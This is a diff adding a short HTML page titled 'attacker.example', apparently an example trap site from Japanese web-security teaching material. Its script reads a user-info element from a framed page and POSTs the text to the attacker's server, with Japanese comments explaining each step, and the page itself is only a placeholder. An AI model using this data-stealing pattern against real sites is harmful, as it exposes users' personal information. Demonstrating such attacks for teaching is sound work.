@@ -1,0 +1,19 @@
+<html>
+<head>
+    <title>attacker.example</title>
+    <script>
+        function load() {
+            //ユーザ情報を読み取る
+            const userInfo = frm.document.querySelector("#user_info");
+            //ユーザ情報の文字列をattacker.exampleのサーバに送信する
+            fetch("./log", { method: "POST", body: userInfo.textContent });
+        }
+    </script>
+</head>
+<body>
+    <div>
+        <!--ユーザを誘導する罠サイトのコンテンツ-->
+    </div>
+    <
+</body>
+</html>
